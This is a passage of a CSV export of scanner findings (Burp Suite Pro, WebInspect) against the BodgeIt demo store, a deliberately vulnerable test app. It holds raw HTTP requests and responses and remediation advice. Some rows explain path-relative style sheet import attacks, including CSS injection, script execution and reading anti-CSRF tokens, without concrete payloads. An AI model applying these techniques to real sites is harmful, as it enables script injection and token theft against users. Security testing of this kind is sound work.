still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li> <li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL ""/original-path/file.php/extra-junk/styles/main.css""), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol> <p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate. Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p> <ul> <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li> <li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>","<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p> <ul><li>Setting the HTTP response header ""X-Frame-Options: deny"" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. ""&lt;!doctype html&gt;"") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li> <li>Setting the HTTP response header ""X-Content-Type-Options: no sniff"" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>","","",""
"DemoApps","","Bodgeit","54","Path-relative style sheet import","","Info","Open","2015-10-15","Burp Suite Pro","73","External Control of File Name or Path","","/bodgeit/search.jsp","","","http://localhost:8080/bodgeit/search.jsp","","GET /bodgeit/search.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2216 Date: Mon, 28 Mar 2016 20:11:18 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Search</h3> <font size=""-1""> <FORM name='query' method='GET'> <table> <tr><td>Search for</td><td><input type='text' name='q'></td></td> <tr><td></td><td><input type='submit' value='Search'/></td></td> <tr><td></td><td><a href='advanced.jsp' style='font-size:9pt;'>Advanced Search</a></td></td> </table> </form> </font> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold. Issue Background: <p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p> <ol> <li>A response contains a style sheet import that uses a path-relative URL (for example, the page at ""/original-path/file.php"" might import ""styles/main.css"").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, ""/original-path/file.php/extra-junk/""). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li> <li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL ""/original-path/file.php/extra-junk/styles/main.css""), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol> <p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate. Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p> <ul> <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li> <li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>","<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p> <ul><li>Setting the HTTP response header ""X-Frame-Options: deny"" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. ""&lt;!doctype html&gt;"") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li> <li>Setting the HTTP response header ""X-Content-Type-Options: no sniff"" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>","","",""
"DemoApps","","Bodgeit","33","System Information Leak: External","","Info","Open","2015-10-15","WebInspect","200","Information Exposure","","/bodgeit/","","","http://localhost:8080/bodgeit/","","GET /bodgeit/ HTTP/1.1 Referer: http://localhost:8080/bodgeit Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""C94A4F2D201EA672774C0CF0F9E62874""; PSID=""26C30058A02AB9F668E03E69787FAB9C""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; Format=""Relative""; LinkKind=""HyperLink""; Locations=""Unspecified""; Source=""LegacyStaticParser""; ThreadId=""43""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""a2c9be11-6166-4b1b-b9d2-305842acfa80""; X-Request-Memo: ID=""4a3d32cf-5e24-4f8f-ae2e-486b3f3f0fa2""; sc=""1""; ThreadId=""59""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3209 Date: Thu, 15 Oct 2015 19:09:36 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Our Best Deals!</h3> <center><table border=""1"" class=""border"" width=""80%""> <tr><th>Product</th><th>Type</th><th>Price</th></tr> <tr> <td><a href=""product.jsp?prodid=7"">Thingie 4</a></td><td>Thingies</td><td align=""right"">$3.50</td> </tr> <tr> <td><a href=""product.jsp?prodid=20"">Whatsit taste like</a></td><td>Whatsits</td><td align=""right"">$3.96</td> </tr> <tr> <td><a href=""product.jsp?prodid=5"">Thingie 2</a></td><td>Thingies</td><td align=""right"">$3.20</td> </tr> <tr> <td><a href=""product.jsp?prodid=22"">GZ XT4</a></td><td>Gizmos</td><td align=""right"">$4.45</td> </tr> <tr> <td><a href=""product.jsp?prodid=12"">TGJ CCD</a></td><td>Thingamajigs</td><td align=""right"">$2.20</td> </tr> <tr> <td><a href=""product.jsp?prodid=23"">GZ ZX3</a></td><td>Gizmos</td><td align=""right"">$3.81</td> </tr> <tr> <td><a href=""product.jsp?prodid=9"">TGJ AAA</a></td><td>Thingamajigs</td><td align=""right"">$0.90</td> </tr> <tr> <td><a href=""product.jsp?prodid=17"">Whatsit called</a></td><td>Whatsits</td><td align=""right"">$4.10</td> </tr> <tr> <td><a href=""product.jsp?prodid=16"">TGJ JJJ</a></td><td>Thingamajigs</td><td align=""right"">$0.80</td> </tr> <tr> <td><a href=""product.jsp?prodid=5"">Thingie 2</a></td><td>Thingies</td><td align=""right"">$3.20</td> </tr> </table></center><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","38","System Information Leak: External","","Info","Open","2015-10-15","WebInspect","200","Information Exposure","","/bodgeit/about.jsp","","","http://localhost:8080/bodgeit/about.jsp","","GET /bodgeit/about.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/ Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""6AB2C4FFBEC53F971ED8853B64A063B9""; PSID=""C94A4F2D201EA672774C0CF0F9E62874""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""href""; Format=""NonRooted""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""78""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""fe1d28a7-1482-4adb-89a5-d8fce555edb9""; X-Request-Memo: ID=""3b7c2581-a651-4340-9756-548c052c3747""; sc=""2""; ThreadId=""59""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2197 Date: Thu, 15 Oct 2015 19:10:01 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>About Us</h3> Here at the BodgeIt Store we live up to our name and our motto!<br/><br/> OK, so this is really a test application that contains a range of vulnerabilities.<br/><br/> How many can you find and exploit?? <br/><br/> Check your progress on the <a href=""score.jsp"">Scoring page</a>. </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","60","Email addresses disclosed","","Info","Open","2015-10-15","Burp Suite Pro","200","Information Exposure","","/bodgeit/admin.jsp","","","http://localhost:8080/bodgeit/admin.jsp","","GET /bodgeit/admin.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2892 Date: Mon, 28 Mar 2016 20:10:49 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Admin page</h3> <br/><center><table class=""border"" width=""80%""> <tr><th>UserId</th><th>User</th><th>Role</th><th>BasketId</th></tr> <tr> <td>1</td><td>user1@thebodgeitstore.com</td><td>USER</td><td>0</td> </tr> <tr> <td>2</td><td>admin@thebodgeitstore.com</td><td>ADMIN</td><td>0</td> </tr> <tr> <td>3</td><td>test@thebodgeitstore.com</td><td>USER</td><td>1</td> </tr> </table></center><br/> <br/><center><table class=""border"" width=""80%""> <tr><th>BasketId</th><th>UserId</th><th>Date</th></tr> <tr> <td>1</td><td>3</td><td>2016-03-28 15:07:56.862</td> </tr> <tr> <td>2</td><td>0</td><td>2016-03-28 15:09:55.338</td> </tr> </table></center><br/> <br/><center><table class=""border"" width=""80%""> <tr><th>BasketId</th><th>ProductId</th><th>Quantity</th></tr> <tr> <td>1</td><td>1</td><td>1</td> </tr> <tr> <td>1</td><td>3</td><td>2</td> </tr> <tr> <td>1</td><td>5</td><td>3</td> </tr> <tr> <td>1</td><td>7</td><td>4</td> </tr> <tr> <td>2</td><td>28</td><td>11</td> </tr> </table></center><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The following email addresses were disclosed in the response:<ul><li>admin@thebodgeitstore.com</li><li>test@thebodgeitstore.com</li><li>user1@thebodgeitstore.com</li></ul> Issue Background: <p>The presence of email addresses within application responses does not necessarily constitute a security vulnerability. Email addresses may appear intentionally within contact information, and many applications (such as web mail) include arbitrary third-party email addresses within their core content.</p> <p>However, email addresses of developers and other individuals (whether appearing on-screen or hidden within page source) may disclose information that is useful to an attacker; for example, they may represent usernames that can be used at the application's login, and they may be used in social engineering attacks against the organization's personnel. Unnecessary or excessive disclosure of email addresses may also lead to an increase in the volume of spam email received.</p>","<p>Consider removing any email addresses that are unnecessary, or replacing personal addresses with anonymous mailbox addresses (such as helpdesk@example.com).</p> <p>To reduce the quantity of spam sent to anonymous mailbox addresses, consider hiding the email address and instead providing a form that generates the email server-side, protected by a CAPTCHA if necessary. </p>","","",""
"DemoApps","","Bodgeit","18","System Information Leak: External","","Info","Open","2015-10-15","WebInspect","200","Information Exposure","","/bodgeit/advanced.jsp","","","http://localhost:8080/bodgeit/advanced.jsp","","GET /bodgeit/advanced.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/search.jsp Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""3FCED1E456DB34600C5D54DA71EE2BF9""; PSID=""AE7851E50AFD85513BB54F24E68F4737""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""href""; Format=""NonRooted""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""120""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""a5fcf0ca-6e74-4843-87aa-751d97840a9f""; X-Request-Memo: ID=""b6322409-b140-4269-b98e-1ef2335a7851""; sc=""1""; ThreadId=""57""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01;b_id=3","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3262 Date: Thu, 15 Oct 2015 19:10:52 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <SCRIPT> loadfile('./js/encryption.js'); var key = ""d07cd921-72e7-48""; function validateForm(form){ var query = document.getElementById('query'); var q = document.getElementById('q'); var val = encryptForm(key, form); if(val){ q.value = val; query.submit(); } return false; } function encryptForm(key, form){ var params = form_to_params(form).replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/""/g, '&quot;').replace(/'/g, '&#39'); if(params.length > 0) return Aes.Ctr.encrypt(params, key, 128); return false; } </SCRIPT> <h3>Search</h3> <font size=""-1""> <form id=""advanced"" name=""advanced"" method=""POST"" onsubmit=""return validateForm(this);false;""> <table> <tr><td>Product:</td><td><input id='product' type='text' name='product' /></td></td> <tr><td>Description:</td><td><input id='desc' type='text' name='description' /></td></td> <tr><td>Type:</td><td><input id='type' type='text' name='type' /></td></td> <tr><td>Price:</td><td><input id='price' type='text' name='price' /></td></td> <tr><td></td><td><input type='submit' value='Search'/></td></td> </table> </form> <form id=""query"" name=""advanced"" method=""POST""> <input id='q' type=""hidden"" name=""q"" value="""" /> </form> </font> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","9","System Information Leak: External","","Info","Open","2015-10-15","WebInspect","200","Information Exposure","","/bodgeit/basket.jsp","","","http://localhost:8080/bodgeit/basket.jsp","","GET /bodgeit/basket.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/ Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""3B81ACA60DABBBBC6BD8AF73C438EDDD""; PSID=""C94A4F2D201EA672774C0CF0F9E62874""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""href""; Format=""NonRooted""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""75""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""ed8f891e-fc8f-4ce4-a209-af250926fd90""; X-Request-Memo: ID=""6aa3dba2-7a73-4f2b-b7fc-e45bbac20cf5""; sc=""1""; ThreadId=""57""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Set-Cookie: b_id=3 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2698 Date: Thu, 15 Oct 2015 19:10:02 GMT <script type=""text/javascript""> function incQuantity (prodid) { var q = document.getElementById('quantity_' + prodid); if (q != null) { var val = ++q.value; if (val > 12) { val = 12; } q.value = val; } } function decQuantity (prodid) { var q = document.getElementById('quantity_' + prodid); if (q != null) { var val = --q.value; if (val < 0) { val = 0; } q.value = val; } } </script> <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Your Basket</h3> <form action=""basket.jsp"" method=""post""> <table border=""1"" class=""border"" width=""80%""> 